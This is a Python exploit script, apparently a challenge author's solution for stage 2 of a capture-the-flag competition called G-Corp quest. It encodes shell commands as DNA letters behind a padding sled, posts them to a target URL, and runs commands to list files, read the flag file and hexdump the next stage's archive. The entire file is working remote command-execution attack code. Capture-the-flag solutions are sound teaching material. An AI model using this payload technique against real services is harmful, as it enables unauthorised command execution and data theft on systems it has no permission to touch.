#!/usr/bin/env python3
# -!- encoding:utf8 -!-
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#    file: exploit_stage_2
#    date: 2017-09-18
#  author: paul.dautry
# purpose:
#       A working exploit for G-Corp quest challenge stage 2
# license:
#       GPLv3
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#===============================================================================
# IMPORTS
#===============================================================================
import requests
import os.path as path
from ruamel import yaml
from argparse import ArgumentParser
#===============================================================================
# CLASSES
#===============================================================================
##
## @brief      Class for exploit.
##
class Exploit(object):
    ##
    ## @brief      Constructs the object.
    ##
    ## @param      url  The target url
    ##
    def __init__(self, url):
        super(Exploit, self).__init__()
        self.url = url
    ##
    ## @brief      { function_description }
    ##
    ## @param      o     { parameter_description }
    ##
    def __b2d(self, o):
        dna = b''
        for i in range(0,4):
            v = (o >> ((3-i)*2)) & 3
            if v == 0:
                dna += b'A'
            elif v == 1:
                dna += b'C'
            elif v == 2:
                dna += b'G'
            elif v == 3:
                dna += b'T'
        return dna
    ##
    ## @brief      { function_description }
    ##
    ## @param      data  The data
    ##
    def __dna_encode(self, data):
        dna = b''
        for o in data:
            dna += self.__b2d(o)
        return dna
    ##
    ## @brief      { function_description }
    ##
    ## @param      cmd   The command
    ##
    def __exec_cmd(self, cmd):
        print("[exploit](GCorp - Stage 2)> sending command: {}".format(cmd))
        payload = self.__b2d(0x90) * 128
        payload += self.__dna_encode(cmd.encode())
        payload += self.__b2d(0x00)
        print("[exploit](GCorp - Stage 2)> payload: {}".format(payload))
        try:
            resp = requests.post(self.url, data=payload, timeout=7)
        except Exception as e:
            print(e)
            return None
        print('-' * 80)
        print(resp.content)
        print('-' * 80)
        return resp.content
    ##
    ## @brief      { function_description }
    ##
    def run(self):
        print("[exploit](GCorp - Stage 2)> exploit running...")
        resp = requests.get(self.url, timeout=1)
        print(resp.content.decode())
        if self.__exec_cmd('ls -lah') is None:
            print("[exploit](GCorp - Stage 2)> error: failed to list "
                  "directory content.")
            return False

        content = self.__exec_cmd('cat .flag.txt')
        if not b'INSA{' in content:
            print("[exploit](GCorp - Stage 2)> error: failed to get the flag.")
            return False

        res = self.__exec_cmd('hexdump -C stage_3_storage.zip')
        if not res or len(res) < 500:
            print("[exploit](GCorp - Stage 2)> error: failed to get archive "
                  "hexdump.")
            return False

        return True
#===============================================================================
# SCRIPT
#===============================================================================
if __name__ == '__main__':
    current_dir = path.dirname(path.abspath(__file__))

    with open(path.join(current_dir, '..', '.mkctf.yml')) as f:
        conf = yaml.safe_load(f)

    parameters = conf['parameters']

    p = ArgumentParser(add_help=True, description="GCorp - Stage 2 exploit")
    p.add_argument('--url', default=parameters['exploit']['url'],
                   help="Target url.")
    args = p.parse_args()

    e = Exploit(args.url)
    exit(0 if e.run() else 1)
